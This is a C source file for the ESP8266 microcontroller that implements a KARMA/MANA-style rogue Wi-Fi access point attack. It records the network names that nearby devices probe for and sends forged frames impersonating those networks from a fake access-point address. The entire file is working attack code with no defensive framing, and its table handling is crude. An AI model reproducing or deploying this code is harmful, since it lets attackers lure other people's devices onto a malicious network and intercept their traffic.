#include "ets_sys.h"
#include "pnl.h"
#include "osapi.h"
#include "mem.h"

uint8_t fake_ap_addr[6] = {0x11,0x22,0x33,0x44,0x55,0x66};
uint8_t fake_bc_addr[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};

/*
  super simple implementation of sensepost's 2015 mana
  to karma on esp8266.
*/

int storedPNLs = 0;
struct PNLBuffer *pnlArray = NULL;

void initPNL()
{
  // can't have memory leaks if your memory allocation is static.
  pnlArray = (struct PNLBuffer *)os_malloc(sizeof(struct PNLBuffer) * 100);
  os_memset(pnlArray,0,sizeof(struct PNLBuffer)* 100);
  return;
}

void storePNL(uint8_t *mac, char *ssid, uint8_t ssid_size)
{
  int i = 0;
  for(i = 0;i < storedPNLs;i++)
  {
    if(os_memcmp(pnlArray[i].mac,mac,6) == 0 && os_memcmp(pnlArray[i].ssid_buf,ssid,ssid_size) == 0)
    {
      os_printf("I already have this combination\n");
      return;
    }
  }
  os_memcpy(pnlArray[i].mac,mac,6);
  os_memcpy(pnlArray[i].ssid_buf,ssid,ssid_size);
  pnlArray[i].ssid_size = ssid_size;
  // TODO: better backoff algo.
  if(storedPNLs == 99)
  {
    storedPNLs = 0;
  }
  storedPNLs += 1;
  return;
}

void beaconPNL(uint8_t *mac,uint16_t seqn)
{
  uint8_t beacon_buf[256];
  char ssid[50];
  int i = 0;
  for(i = 0;i < storedPNLs;i++)
  {
    if(os_memcmp(pnlArray[i].mac,mac,6) == 0)
    {
      os_memcpy(ssid,pnlArray[i].ssid_buf,pnlArray[i].ssid_size);
      ssid[pnlArray[i].ssid_size] = 0;
      
      os_printf("This MAC knows SSID %s\n",ssid);
      char beacon_resp[256];
      int size = beaconresp(beacon_resp, mac, fake_ap_addr, seqn, pnlArray[i].ssid_size, pnlArray[i].ssid_buf);
      wifi_send_pkt_freedom(beacon_resp,size,0);
    }
  }
}
